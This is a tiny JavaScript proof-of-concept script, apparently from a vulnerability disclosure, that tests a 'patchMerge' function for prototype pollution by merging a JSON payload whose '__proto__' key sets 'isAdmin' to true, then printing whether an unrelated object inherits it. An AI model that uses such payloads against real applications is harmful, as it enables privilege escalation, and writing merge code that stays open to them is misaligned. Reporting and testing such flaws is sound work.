patchMerge = require('./index.js');
var obj = {}
console.log("Before : " + obj.isAdmin);
console.log(patchMerge(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}')));
console.log("After : " + obj.isAdmin);
